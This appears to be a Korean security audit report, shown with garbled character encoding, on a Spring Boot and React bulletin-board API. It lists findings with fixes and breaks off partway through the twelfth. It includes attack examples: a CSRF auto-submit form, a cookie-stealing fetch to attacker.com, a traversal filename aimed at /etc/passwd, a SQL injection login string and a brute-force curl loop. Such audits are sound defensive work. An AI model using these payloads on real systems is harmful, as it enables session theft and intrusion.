# API ë³´ì•ˆ í‰ê°€ ë³´ê³ ì„œ

**ì• í”Œë¦¬ì¼€ì´ì…˜**: ê²Œì‹œíŒ ì‹œìŠ¤í…œ (Spring Boot + React)
**í‰ê°€ ì¼ì**: 2025-11-08
**í‰ê°€ ìœ í˜•**: ë³´ì•ˆ ì¤‘ì‹¬ API ë³´ì•ˆ ê²€í† 
**ì‹¬ê°ë„ ë“±ê¸‰**: ğŸ”´ ì¹˜ëª…ì  | ğŸŸ  ë†’ìŒ | ğŸŸ¡ ì¤‘ê°„ | ğŸŸ¢ ë‚®ìŒ

---

## ìš”ì•½

ë³¸ ë³´ì•ˆ í‰ê°€ì—ì„œ ì¸ì¦, ê¶Œí•œ ë¶€ì—¬, ì„¸ì…˜ ê´€ë¦¬, CSRF ë³´í˜¸, ì…ë ¥ ê²€ì¦, íŒŒì¼ ì²˜ë¦¬ ì „ë°˜ì— ê±¸ì³ **14ê°œì˜ ë³´ì•ˆ ì·¨ì•½ì **ì„ ë°œê²¬í–ˆìŠµë‹ˆë‹¤. ì• í”Œë¦¬ì¼€ì´ì…˜ì€ ê¸°ë³¸ ë³´ì•ˆ í”„ë ˆì„ì›Œí¬(Spring Security)ê°€ ì—†ìœ¼ë©° **4ê°œì˜ ì¹˜ëª…ì ** ë° **5ê°œì˜ ë†’ìŒ** ì‹¬ê°ë„ ë¬¸ì œê°€ ì¦‰ê°ì ì¸ í•´ê²°ì„ ìš”êµ¬í•©ë‹ˆë‹¤.

**ìœ„í—˜ ì ìˆ˜**: 7.2/10 (ë†’ì€ ìœ„í—˜)

**ìš°ì„ ìˆœìœ„**:
1. ëª¨ë“  ìƒíƒœ ë³€ê²½ ì‘ì—…ì— CSRF ë³´í˜¸ êµ¬í˜„
2. ê°•ë ¥í•œ ì¸ì¦/ê¶Œí•œ ë¶€ì—¬ë¥¼ ìœ„í•œ Spring Security í”„ë ˆì„ì›Œí¬ ì¶”ê°€
3. ë³´ì•ˆ ì„¸ì…˜ ì¿ í‚¤ ì†ì„± êµ¬ì„± (HttpOnly, Secure, SameSite)
4. íŒŒì¼ ì‘ì—…ì— ëŒ€í•œ í¬ê´„ì ì¸ ê¶Œí•œ ê²€ì‚¬ êµ¬í˜„

---

## ë³´ì•ˆ ë°œê²¬ì‚¬í•­

### ğŸ”´ ì¹˜ëª…ì  ì‹¬ê°ë„

#### 1. CSRF ë³´í˜¸ ëˆ„ë½
**ìœ„ì¹˜**: ëª¨ë“  ì»¨íŠ¸ë¡¤ëŸ¬
**CWE**: CWE-352 (ì‚¬ì´íŠ¸ ê°„ ìš”ì²­ ìœ„ì¡°)
**OWASP**: A01:2021 â€“ ê¹¨ì§„ ì ‘ê·¼ ì œì–´

**ë¬¸ì œì **:
CSRF í† í°ì´ë‚˜ ë³´í˜¸ ë©”ì»¤ë‹ˆì¦˜ì´ ì¡´ì¬í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ëª¨ë“  ìƒíƒœ ë³€ê²½ ì—”ë“œí¬ì¸íŠ¸(`POST`, `PUT`, `DELETE`)ê°€ CSRF ê³µê²©ì— ì·¨ì•½í•©ë‹ˆë‹¤.

**ì˜í–¥ë°›ëŠ” ì—”ë“œí¬ì¸íŠ¸**:
- `POST /api/users/signup`
- `POST /api/users/login`
- `POST /api/users/logout`
- `POST /api/posts`, `PUT /api/posts/{id}`, `DELETE /api/posts/{id}`
- `POST /api/comments`, `PUT /api/comments/{id}`, `DELETE /api/comments/{id}`
- `POST /api/posts/{postId}/excel`, `DELETE /api/posts/{postId}/excel`
- `POST /api/files/upload`, `DELETE /api/files/{fileId}`

**ê³µê²© ì‹œë‚˜ë¦¬ì˜¤**:
```html
<!-- ê³µê²©ìì˜ ì•…ì„± ì›¹ì‚¬ì´íŠ¸ -->
<form action="http://localhost:8080/api/posts/123" method="POST">
  <input type="hidden" name="isNotice" value="true">
</form>
<script>document.forms[0].submit();</script>
```
í”¼í•´ìê°€ ë¡œê·¸ì¸ ìƒíƒœë¼ë©´, ê·¸ë“¤ì˜ ì„¸ì…˜ì´ ê¶Œí•œ ì—†ëŠ” ì‘ì—…ì„ ì‹¤í–‰í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.

**í•´ê²° ë°©ë²•**:
```java
// Spring Security CSRF ë³´í˜¸ ì¶”ê°€
@Configuration
@EnableWebSecurity
public class SecurityConfig extends WebSecurityConfigurerAdapter {
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            .csrf().csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            .and()
            .sessionManagement()
                .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED);
    }
}
```

í”„ë¡ íŠ¸ì—”ë“œ axios ì¸í„°ì…‰í„°:
```javascript
axios.interceptors.request.use(config => {
    const token = document.cookie.match(/XSRF-TOKEN=([^;]+)/)?.[1];
    if (token) config.headers['X-XSRF-TOKEN'] = token;
    return config;
});
```

---

#### 2. ì•ˆì „í•˜ì§€ ì•Šì€ ì„¸ì…˜ ì¿ í‚¤ ì„¤ì •
**ìœ„ì¹˜**: `application.yml`
**CWE**: CWE-614 ('Secure' ì†ì„±ì´ ì—†ëŠ” ì¤‘ìš”í•œ ì¿ í‚¤), CWE-1004 ('HttpOnly'ê°€ ì—†ëŠ” ì¤‘ìš”í•œ ì¿ í‚¤)
**OWASP**: A05:2021 â€“ ë³´ì•ˆ êµ¬ì„± ì˜¤ë¥˜

**ë¬¸ì œì **:
ì„¸ì…˜ ì¿ í‚¤ì— ë³´ì•ˆ ì†ì„±ì´ ëˆ„ë½ë¨:
- `HttpOnly` í”Œë˜ê·¸ ì—†ìŒ â†’ XSS ê¸°ë°˜ ì„¸ì…˜ íƒˆì·¨ì— ì·¨ì•½
- `Secure` í”Œë˜ê·¸ ì—†ìŒ â†’ ì•”í˜¸í™”ë˜ì§€ ì•Šì€ HTTPë¥¼ í†µí•´ ì „ì†¡ë¨
- `SameSite` ì†ì„± ì—†ìŒ â†’ CSRF ë³´í˜¸ ê³µë°±

**í˜„ì¬ ì„¤ì •**:
```yaml
# application.yml
spring:
  servlet:
    session:
      timeout: 1800  # íƒ€ì„ì•„ì›ƒë§Œ êµ¬ì„±ë¨
```

**ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ (XSS + ì„¸ì…˜ íƒˆì·¨)**:
```javascript
// ê³µê²©ìê°€ ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ ì£¼ì…
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```
`HttpOnly`ê°€ ì—†ìœ¼ë©´ XSSë¥¼ í†µí•´ ì„¸ì…˜ ì¿ í‚¤ë¥¼ íƒˆì·¨ë‹¹í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**í•´ê²° ë°©ë²•**:
```yaml
server:
  servlet:
    session:
      cookie:
        http-only: true
        secure: true        # í”„ë¡œë•ì…˜ì—ì„œ HTTPS í•„ìš”
        same-site: strict   # CSRF ë°©ì§€
        max-age: 1800
```

---

#### 3. ì•½í•œ ë¹„ë°€ë²ˆí˜¸ í•´ì‹± (ì†”íŠ¸ ì—†ëŠ” SHA-256)
**ìœ„ì¹˜**: `PasswordEncoder.java:7`
**CWE**: CWE-916 (ë¶ˆì¶©ë¶„í•œ ê³„ì‚° ë…¸ë ¥ì˜ ë¹„ë°€ë²ˆí˜¸ í•´ì‹œ ì‚¬ìš©)
**OWASP**: A02:2021 â€“ ì•”í˜¸í™” ì‹¤íŒ¨

**ë¬¸ì œì **:
ì†”íŠ¸ ì—†ëŠ” SHA-256 ì‚¬ìš©, ë‹¤ìŒ ê³µê²©ì— ì·¨ì•½:
- **ë ˆì¸ë³´ìš° í…Œì´ë¸” ê³µê²©**: ì‚¬ì „ ê³„ì‚°ëœ í•´ì‹œ ë°ì´í„°ë² ì´ìŠ¤
- **ì‚¬ì „ ê³µê²©**: ë¹ ë¥¸ ë¬´ì°¨ë³„ ëŒ€ì… (ì´ˆë‹¹ ìˆ˜ì‹­ì–µ ê°œì˜ í•´ì‹œ)
- **ë³‘ë ¬ í¬ë™**: GPU ê°€ì†

**í˜„ì¬ êµ¬í˜„**:
```java
public static String encode(String password) {
    return DigestUtils.sha256Hex(password);  // ì†”íŠ¸ ì—†ìŒ, ë¹ ë¥¸ í•´ì‹±
}
```

**ê³µê²© ì‹œì—°**:
```
ì‚¬ìš©ì ì…ë ¥: "password123"
SHA-256 í•´ì‹œ: "ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f"
ê³µê²©ìê°€ ë ˆì¸ë³´ìš° í…Œì´ë¸”ì—ì„œ ì¡°íšŒ â†’ ì¦‰ì‹œ ë§¤ì¹˜
```

**í•´ê²° ë°©ë²•**:
```java
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;

public class PasswordEncoder {
    private static final BCryptPasswordEncoder encoder = new BCryptPasswordEncoder(12);

    public static String encode(String password) {
        return encoder.encode(password);  // ìë™ ì†”íŒ…ì´ í¬í•¨ëœ BCrypt
    }

    public static boolean matches(String raw, String encoded) {
        return encoder.matches(raw, encoded);
    }
}
```

**BCryptë¥¼ ì‚¬ìš©í•˜ëŠ” ì´ìœ **:
- ë¹„ë°€ë²ˆí˜¸ë§ˆë‹¤ ìë™ ì†”íŠ¸ ìƒì„±
- ì ì‘í˜• ì‘ì—… ê³„ìˆ˜ (êµ¬ì„± ê°€ëŠ¥í•œ ë¼ìš´ë“œ)
- í•´ì‹œë‹¹ ~100ms â†’ ë¬´ì°¨ë³„ ëŒ€ì…ì„ ì´ˆë‹¹ ~10íšŒ ì‹œë„ë¡œ ëŠ¦ì¶¤

---

#### 4. íŒŒì¼ ë‹¤ìš´ë¡œë“œì—ì„œ ê¶Œí•œ ê²€ì‚¬ ëˆ„ë½
**ìœ„ì¹˜**: `FileController.java:144-179`, `PostController.java:249-281`
**CWE**: CWE-639 (ì‚¬ìš©ì ì œì–´ í‚¤ë¥¼ í†µí•œ ê¶Œí•œ ìš°íšŒ)
**OWASP**: A01:2021 â€“ ê¹¨ì§„ ì ‘ê·¼ ì œì–´

**ë¬¸ì œì **:
íŒŒì¼ ë‹¤ìš´ë¡œë“œ ì—”ë“œí¬ì¸íŠ¸ê°€ **ëª¨ë“  ì¸ì¦ëœ ì‚¬ìš©ì**ê°€ íŒŒì¼ IDë¥¼ ì¶”ì¸¡í•˜ì—¬ **ëª¨ë“  íŒŒì¼**ì„ ë‹¤ìš´ë¡œë“œí•  ìˆ˜ ìˆë„ë¡ í—ˆìš©í•©ë‹ˆë‹¤. ì†Œìœ ê¶Œì´ë‚˜ ê¶Œí•œ ê²€ì‚¬ê°€ ì—†ìŠµë‹ˆë‹¤.

**ì·¨ì•½í•œ ì—”ë“œí¬ì¸íŠ¸**:
```java
// FileController.java:144
@GetMapping("/download/{fileId}")
public ResponseEntity<Resource> downloadFile(@PathVariable Long fileId) {
    // ê¶Œí•œ ê²€ì‚¬ ì—†ìŒ - ëˆ„êµ¬ë‚˜ ëª¨ë“  íŒŒì¼ ë‹¤ìš´ë¡œë“œ ê°€ëŠ¥
    FileAttachment file = fileAttachmentService.getFileById(fileId);
    // ... íŒŒì¼ ë°˜í™˜
}

// PostController.java:249
@GetMapping("/{postId}/excel/download")
public ResponseEntity<?> downloadExcel(@PathVariable Long postId) {
    // ê¶Œí•œ ê²€ì‚¬ ì—†ìŒ - ëˆ„êµ¬ë‚˜ ëª¨ë“  ì—‘ì…€ íŒŒì¼ ë‹¤ìš´ë¡œë“œ ê°€ëŠ¥
}
```

**ê³µê²© ì‹œë‚˜ë¦¬ì˜¤**:
```bash
# ê³µê²©ìê°€ ì—´ê±°ë¥¼ í†µí•´ íŒŒì¼ ID ë°œê²¬
curl http://localhost:8080/api/files/download/1  # ì„±ê³µ
curl http://localhost:8080/api/files/download/2  # ì„±ê³µ - ìì‹ ì˜ íŒŒì¼ì´ ì•„ë‹˜!
curl http://localhost:8080/api/files/download/3  # ì„±ê³µ - ê°œì¸ ë¬¸ì„œ ìœ ì¶œ
```

**í•´ê²° ë°©ë²•**:
```java
@GetMapping("/download/{fileId}")
public ResponseEntity<Resource> downloadFile(@PathVariable Long fileId, HttpSession session) {
    String userId = (String) session.getAttribute("userId");
    if (userId == null) return ResponseEntity.status(401).build();

    FileAttachment file = fileAttachmentService.getFileById(fileId);
    if (file == null) return ResponseEntity.notFound().build();

    // ê¶Œí•œ ê²€ì‚¬: ì‚¬ìš©ìê°€ ê²Œì‹œë¬¼ ì†Œìœ ìì¸ì§€ í™•ì¸
    Post post = postService.getPostById(file.getPostId());
    if (!post.getAuthorId().equals(userId)) {
        return ResponseEntity.status(403).body("ì ‘ê·¼ ê±°ë¶€ë¨");
    }

    // ... ë‹¤ìš´ë¡œë“œ ì§„í–‰
}
```

---

### ğŸŸ  ë†’ì€ ì‹¬ê°ë„

#### 5. ì†ŒìŠ¤ ì½”ë“œì— í•˜ë“œì½”ë”©ëœ ë°ì´í„°ë² ì´ìŠ¤ ìê²© ì¦ëª…
**ìœ„ì¹˜**: `application.yml:5-6`
**CWE**: CWE-798 (í•˜ë“œì½”ë”©ëœ ìê²© ì¦ëª… ì‚¬ìš©)
**OWASP**: A05:2021 â€“ ë³´ì•ˆ êµ¬ì„± ì˜¤ë¥˜

**ë¬¸ì œì **:
ë°ì´í„°ë² ì´ìŠ¤ ë¹„ë°€ë²ˆí˜¸ê°€ ë²„ì „ ê´€ë¦¬ì— ì»¤ë°‹ë¨:

```yaml
spring:
  datasource:
    url: jdbc:mariadb://localhost:3307/boards?createDatabaseIfNotExist=true
    username: root
    password: 1234  # â† GITì— í•˜ë“œì½”ë”©ëœ ë¹„ë°€ë²ˆí˜¸
```

**ìœ„í—˜**:
- Git íˆìŠ¤í† ë¦¬ì— ìê²© ì¦ëª… ë…¸ì¶œ (ì˜êµ¬ì )
- ì €ì¥ì†Œ ì ‘ê·¼ ê¶Œí•œì´ ìˆëŠ” ëª¨ë“  ì‚¬ëŒì´ DB ì ‘ê·¼ ê°€ëŠ¥
- ë¹„ë°€ë²ˆí˜¸ ë³€ê²½ ì‹œ ì½”ë“œ ìˆ˜ì • í•„ìš”

**í•´ê²° ë°©ë²•**:
```yaml
# application.yml
spring:
  datasource:
    url: ${DB_URL:jdbc:mariadb://localhost:3307/boards}
    username: ${DB_USERNAME:root}
    password: ${DB_PASSWORD}  # í™˜ê²½ ë³€ìˆ˜ë¡œ ì„¤ì •í•´ì•¼ í•¨
```

í™˜ê²½ êµ¬ì„±:
```bash
# .env (ì ˆëŒ€ Gitì— ì»¤ë°‹í•˜ì§€ ë§ ê²ƒ)
export DB_PASSWORD=complex_password_here_123!@#

# ë˜ëŠ” í™˜ê²½ë³„ Spring í”„ë¡œíŒŒì¼ ì‚¬ìš©
java -jar app.jar --spring.profiles.active=prod
```

---

#### 6. CORS ì„¤ì • ì˜¤ë¥˜ - í•˜ë“œì½”ë”©ëœ Origin
**ìœ„ì¹˜**: ëª¨ë“  ì»¨íŠ¸ë¡¤ëŸ¬ (`@CrossOrigin(origins = "http://localhost:3000")`)
**CWE**: CWE-942 (í—ˆìš©ì  í¬ë¡œìŠ¤ ë„ë©”ì¸ ì •ì±…)
**OWASP**: A05:2021 â€“ ë³´ì•ˆ êµ¬ì„± ì˜¤ë¥˜

**ë¬¸ì œì **:
CORS originì´ ì†ŒìŠ¤ ì½”ë“œì— í•˜ë“œì½”ë”©ë˜ì–´ í”„ë¡œë•ì…˜ì— ë¶€ì í•©:

```java
@CrossOrigin(origins = "http://localhost:3000")  // ê°œë°œ í™˜ê²½ì—ì„œë§Œ ì‘ë™
```

**ë¬¸ì œ**:
- í”„ë¡œë•ì…˜ ë„ë©”ì¸ í—ˆìš© ì•ˆ ë¨ â†’ í”„ë¡œë•ì…˜ì—ì„œ ì•± ì¤‘ë‹¨
- ë‹¤ë¥¸ í™˜ê²½ì— ëŒ€í•´ ì½”ë“œ ë³€ê²½ í•„ìš”
- HTTP (HTTPS ì•„ë‹˜) í—ˆìš©ë¨

**í•´ê²° ë°©ë²•**:
```java
// ì»¨íŠ¸ë¡¤ëŸ¬ì—ì„œ @CrossOrigin ì œê±°

// ì „ì—­ CORS êµ¬ì„± ì¶”ê°€
@Configuration
public class WebMvcConfig implements WebMvcConfigurer {
    @Value("${cors.allowed-origins}")
    private String[] allowedOrigins;

    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
            .allowedOrigins(allowedOrigins)
            .allowedMethods("GET", "POST", "PUT", "DELETE")
            .allowCredentials(true)
            .maxAge(3600);
    }
}
```

```yaml
# application.yml
cors:
  allowed-origins: ${CORS_ORIGINS:http://localhost:3000}

# í”„ë¡œë•ì…˜ í™˜ê²½
CORS_ORIGINS=https://app.example.com,https://www.example.com
```

---

#### 7. íŒŒì¼ ì‘ì—…ì˜ ê²½ë¡œ ìˆœíšŒ ì·¨ì•½ì 
**ìœ„ì¹˜**: `PostController.java:224-226`, `FileController.java:118-120`
**CWE**: CWE-22 (ê²½ë¡œ ìˆœíšŒ)
**OWASP**: A03:2021 â€“ ì£¼ì…

**ë¬¸ì œì **:
ê²€ì¦ ì—†ì´ íŒŒì¼ ê²½ë¡œ êµ¬ì„±, ë””ë ‰í† ë¦¬ ìˆœíšŒì— ì·¨ì•½:

```java
// PostController.java:224
String storedFilename = UUID.randomUUID().toString() + "_" + originalFilename;
Path filePath = Paths.get(uploadDir, storedFilename);
```

**ê³µê²© ì‹œë‚˜ë¦¬ì˜¤**:
```bash
# ê³µê²©ìê°€ ì•…ì„± íŒŒì¼ëª…ìœ¼ë¡œ íŒŒì¼ ì—…ë¡œë“œ
POST /api/files/upload
filename: "../../../../etc/passwd"

# ê²°ê³¼:
uploads/uuid_../../../../etc/passwd
â†’ í•´ì„ë¨: /etc/passwd (ì‹œìŠ¤í…œ íŒŒì¼ ë®ì–´ì“°ê¸°)
```

**í•´ê²° ë°©ë²•**:
```java
private Path sanitizeFilePath(String originalFilename) {
    // ë””ë ‰í† ë¦¬ ìˆœíšŒ ì‹œí€€ìŠ¤ ì œê±°
    String sanitized = originalFilename
        .replaceAll("\\.\\.", "")
        .replaceAll("[/\\\\]", "");

    String storedFilename = UUID.randomUUID().toString() + "_" + sanitized;
    Path filePath = Paths.get(uploadDir, storedFilename).normalize();

    // í•´ì„ëœ ê²½ë¡œê°€ ì—…ë¡œë“œ ë””ë ‰í† ë¦¬ ë‚´ì— ìˆëŠ”ì§€ í™•ì¸
    if (!filePath.startsWith(Paths.get(uploadDir).toAbsolutePath())) {
        throw new SecurityException("ì˜ëª»ëœ íŒŒì¼ ê²½ë¡œ");
    }

    return filePath;
}
```

---

#### 8. ì˜¤ë¥˜ ë©”ì‹œì§€ë¥¼ í†µí•œ ì •ë³´ ìœ ì¶œ
**ìœ„ì¹˜**: ëª¨ë“  ì»¨íŠ¸ë¡¤ëŸ¬ (ì˜ˆì™¸ ì²˜ë¦¬ ë¸”ë¡)
**CWE**: CWE-209 (ì˜¤ë¥˜ ë©”ì‹œì§€ë¥¼ í†µí•œ ì •ë³´ ë…¸ì¶œ)
**OWASP**: A04:2021 â€“ ì•ˆì „í•˜ì§€ ì•Šì€ ì„¤ê³„

**ë¬¸ì œì **:
ìƒì„¸í•œ ì˜¤ë¥˜ ë©”ì‹œì§€ê°€ ë‚´ë¶€ êµ¬í˜„ì„ ë…¸ì¶œ:

```java
// UserController.java:36-38
catch (Exception e) {
    error.put("error", e.getMessage());  // ìŠ¤íƒ ì¶”ì , DB ì˜¤ë¥˜ ë…¸ì¶œ
    return ResponseEntity.badRequest().body(error);
}
```

**ê³µê²© ì˜ˆì œ**:
```bash
POST /api/users/login
{"userId": "admin' OR '1'='1", "password": "x"}

ì‘ë‹µ:
{
  "error": "'admin'' ê·¼ì²˜ì˜ êµ¬ë¬¸ì´ ì˜ëª»ë˜ì—ˆìŠµë‹ˆë‹¤; @P1, @P2ë¥¼ ê¸°ëŒ€í•¨...
   at com.example.boards.mapper.UserMapper.findByUserIdAndPassword(UserMapper.java:16)"
}
```
ê³µê²©ìê°€ í•™ìŠµí•¨: SQL êµ¬ë¬¸, íŒŒì¼ ê²½ë¡œ, í”„ë ˆì„ì›Œí¬ ë²„ì „.

**í•´ê²° ë°©ë²•**:
```java
@RestControllerAdvice
public class GlobalExceptionHandler {
    private static final Logger log = LoggerFactory.getLogger(GlobalExceptionHandler.class);

    @ExceptionHandler(Exception.class)
    public ResponseEntity<?> handleGenericException(Exception e) {
        log.error("ì• í”Œë¦¬ì¼€ì´ì…˜ ì˜¤ë¥˜", e);  // ë‚´ë¶€ì ìœ¼ë¡œ ì „ì²´ ì„¸ë¶€ì‚¬í•­ ë¡œê¹…

        Map<String, String> error = new HashMap<>();
        error.put("error", "ìš”ì²­ì„ ì²˜ë¦¬í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.");  // ì¼ë°˜ì ì¸ ë©”ì‹œì§€
        return ResponseEntity.status(500).body(error);
    }

    @ExceptionHandler(IllegalArgumentException.class)
    public ResponseEntity<?> handleValidationException(IllegalArgumentException e) {
        // ì•ˆì „í•œ ì‚¬ìš©ì ëŒ€ìƒ ê²€ì¦ ì˜¤ë¥˜ë§Œ
        return ResponseEntity.badRequest().body(Map.of("error", e.getMessage()));
    }
}
```

---

#### 9. ì¸ì¦ ì—”ë“œí¬ì¸íŠ¸ì— ì†ë„ ì œí•œ ì—†ìŒ
**ìœ„ì¹˜**: `UserController.java:42-59` (ë¡œê·¸ì¸), `UserController.java:28-40` (íšŒì›ê°€ì…)
**CWE**: CWE-307 (ê³¼ë„í•œ ì¸ì¦ ì‹œë„ì˜ ë¶€ì ì ˆí•œ ì œí•œ)
**OWASP**: A07:2021 â€“ ì‹ë³„ ë° ì¸ì¦ ì‹¤íŒ¨

**ë¬¸ì œì **:
ì œí•œì´ë‚˜ ì†ë„ ì œí•œ ì—†ìŒ â†’ ê³µê²©ìê°€ ë‹¤ìŒì„ í•  ìˆ˜ ìˆìŒ:
- **ë¹„ë°€ë²ˆí˜¸ ë¬´ì°¨ë³„ ëŒ€ì…**: ì´ˆë‹¹ ìˆ˜ì²œ ë²ˆì˜ ì‹œë„
- **ì‚¬ìš©ì ì—´ê±°**: ì‚¬ìš©ì ì´ë¦„ ì¡´ì¬ í…ŒìŠ¤íŠ¸
- **DoS ê³µê²©**: ì„œë²„ ë¦¬ì†ŒìŠ¤ ê³ ê°ˆ

**ê³µê²© ì‹œë‚˜ë¦¬ì˜¤**:
```bash
# ìë™í™”ëœ ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©
for password in $(cat common-passwords.txt); do
  curl -X POST http://localhost:8080/api/users/login \
    -d "{\"userId\":\"admin\",\"password\":\"$password\"}"
done
# ì§€ì—° ì—†ìŒ, ì°¨ë‹¨ ì—†ìŒ, ë¬´ì œí•œ ì‹œë„
```

**í•´ê²° ë°©ë²•**:
```java
// ì˜ì¡´ì„± ì¶”ê°€: bucket4j ë˜ëŠ” resilience4j-ratelimiter
@RestController
@RequestMapping("/api/users")
public class UserController {
    private final Map<String, RateLimiter> loginLimiters = new ConcurrentHashMap<>();

    @PostMapping("/login")
    public ResponseEntity<?> login(@RequestBody LoginRequest request, HttpSession session) {
        // ì†ë„ ì œí•œ: IPë‹¹ ë¶„ë‹¹ 5íšŒ ì‹œë„
        RateLimiter limiter = loginLimiters.computeIfAbsent(
            request.getUserId(),
            k -> RateLimiter.create(5.0 / 60.0)  // 60ì´ˆë‹¹ 5íšŒ
        );

        if (!limiter.tryAcquire()) {
            return ResponseEntity.status(429)
                .body(Map.of("error", "ë„ˆë¬´ ë§ì€ ë¡œê·¸ì¸ ì‹œë„. ì ì‹œ í›„ ë‹¤ì‹œ ì‹œë„í•˜ì„¸ìš”."));
        }

        // ... ì¸ì¦ ì§„í–‰
    }
}
```

ëŒ€ì•ˆ: Spring Securityì˜ ë¡œê·¸ì¸ ì‹œë„ ì œí•œ ì‚¬ìš©.

---

### ğŸŸ¡ ì¤‘ê°„ ì‹¬ê°ë„

#### 10. ìš”ì²­ ë³¸ë¬¸ì˜ ì…ë ¥ ê²€ì¦ ëˆ„ë½
**ìœ„ì¹˜**: ëª¨ë“  ì»¨íŠ¸ë¡¤ëŸ¬ (DTO)
**CWE**: CWE-20 (ë¶€ì ì ˆí•œ ì…ë ¥ ê²€ì¦)
**OWASP**: A03:2021 â€“ ì£¼ì…

**ë¬¸ì œì **:
DTOì— ê²€ì¦ ì–´ë…¸í…Œì´ì…˜ ì—†ìŒ:

```java
public class SignupRequest {
    private String userId;      // @NotBlank, @Size, @Pattern ì—†ìŒ
    private String password;    // ìµœì†Œ ê¸¸ì´ ê²€ì‚¬ ì—†ìŒ
    private String email;       // @Email ê²€ì¦ ì—†ìŒ
    // ...
}
```

**í•´ê²° ë°©ë²•**:
```java
import javax.validation.constraints.*;

public class SignupRequest {
    @NotBlank(message = "ì•„ì´ë””ëŠ” í•„ìˆ˜ì…ë‹ˆë‹¤")
    @Size(min = 4, max = 20, message = "ì•„ì´ë””ëŠ” 4-20ìì—¬ì•¼ í•©ë‹ˆë‹¤")
    @Pattern(regexp = "^[a-zA-Z0-9_]+$", message = "ì˜ë¬¸, ìˆ«ì, _ë§Œ ê°€ëŠ¥í•©ë‹ˆë‹¤")
    private String userId;

    @NotBlank(message = "ë¹„ë°€ë²ˆí˜¸ëŠ” í•„ìˆ˜ì…ë‹ˆë‹¤")
    @Size(min = 8, max = 100, message = "ë¹„ë°€ë²ˆí˜¸ëŠ” ìµœì†Œ 8ì ì´ìƒ")
    @Pattern(regexp = "^(?=.*[A-Za-z])(?=.*\\d)(?=.*[@$!%*#?&])[A-Za-z\\d@$!%*#?&]+$",
             message = "ì˜ë¬¸, ìˆ«ì, íŠ¹ìˆ˜ë¬¸ìë¥¼ í¬í•¨í•´ì•¼ í•©ë‹ˆë‹¤")
    private String password;

    @NotBlank(message = "ì´ë©”ì¼ì€ í•„ìˆ˜ì…ë‹ˆë‹¤")
    @Email(message = "ì˜¬ë°”ë¥¸ ì´ë©”ì¼ í˜•ì‹ì´ ì•„ë‹™ë‹ˆë‹¤")
    private String email;
}

// ì»¨íŠ¸ë¡¤ëŸ¬
@PostMapping("/signup")
public ResponseEntity<?> signup(@Valid @RequestBody SignupRequest request) {
    // @Validê°€ ìë™ìœ¼ë¡œ ê²€ì¦ íŠ¸ë¦¬ê±°
}
```

---

#### 11. ì•ˆì „í•˜ì§€ ì•Šì€ íŒŒì¼ ì €ì¥ ìœ„ì¹˜
**ìœ„ì¹˜**: `PostController.java:36`, `FileController.java:36`
**CWE**: CWE-552 (ì™¸ë¶€ ë‹¹ì‚¬ìê°€ ì ‘ê·¼ ê°€ëŠ¥í•œ íŒŒì¼ ë˜ëŠ” ë””ë ‰í† ë¦¬)
**OWASP**: A01:2021 â€“ ê¹¨ì§„ ì ‘ê·¼ ì œì–´

**ë¬¸ì œì **:
ì• í”Œë¦¬ì¼€ì´ì…˜ ë£¨íŠ¸ ë‚´ì˜ `uploads/` ë””ë ‰í† ë¦¬ì— íŒŒì¼ ì €ì¥:
- ì›¹ ì„œë²„ ì„¤ì • ì˜¤ë¥˜ë¡œ ê³µê°œ ì ‘ê·¼ ê°€ëŠ¥í•  ìˆ˜ ìˆìŒ
- ì‚¬ìš©ì/ë¯¼ê°ë„ ìˆ˜ì¤€ë³„ë¡œ ë¶„ë¦¬ë˜ì§€ ì•ŠìŒ
- ì €ì¥ ì‹œ ì•”í˜¸í™” ì—†ìŒ

**í•´ê²° ë°©ë²•**:
```java
@Value("${file.upload.directory}")
private String uploadDir;  // ì›¹ì•± ì™¸ë¶€, ì˜ˆ: /var/app/files

// ì‚¬ìš©ì ë° ë‚ ì§œë³„ë¡œ êµ¬ì„±
private Path generateFilePath(String userId, String filename) {
    LocalDate today = LocalDate.now();
    String relativePath = String.format("%s/%d/%02d/%02d",
        userId, today.getYear(), today.getMonthValue(), today.getDayOfMonth());

    Path userDir = Paths.get(uploadDir, relativePath);
    Files.createDirectories(userDir);

    return userDir.resolve(UUID.randomUUID() + "_" + filename);
}
```

---

#### 12. ê²€ìƒ‰ ì¿¼ë¦¬ì˜ SQL ì£¼ì… ìœ„í—˜ (ì™„í™”ë˜ì—ˆìœ¼ë‚˜ ì•½í•¨)
**ìœ„ì¹˜**: `PostMapper.xml:38-39`, `PostService.java:20-28`
**CWE**: CWE-89 (SQL ì£¼ì…)
**OWASP**: A03:2021 â€“ ì£¼ì…

**ë¬¸ì œì **:
LIKE íŒ¨í„´ ì´ìŠ¤ì¼€ì´í”„ê°€ ì¡´ì¬í•˜ì§€ë§Œ ìˆ˜ë™ êµ¬í˜„ì— ì˜ì¡´:

```java
// PostService.java:25-27
return searchQuery.replace("\\", "\\\\")
                 .replace("%", "\\%")
                 .replace("_", "\\_");
```

**ìœ„í—˜**: í–¥í›„ ì½”ë“œì—ì„œ ì´ìŠ¤ì¼€ì´í”„ë¥¼ ë†“ì¹˜ë©´ SQL ì£¼ì… ê°€ëŠ¥.

**í˜„ì¬ ë³´í˜¸**:
```xml
<!-- PostMapper.xml:38 -->
p.title LIKE CONCAT('%', #{searchQuery}, '%') ESCAPE '\\'
```
MyBatis ë§¤ê°œë³€ìˆ˜í™” + ESCAPE ì ˆì´ ì´ìŠ¤ì¼€ì´í”„ê°€ ì ìš©**ë˜ë©´** ì£¼ì… ë°©ì§€.

**ê¶Œì¥ ì‚¬í•­**:
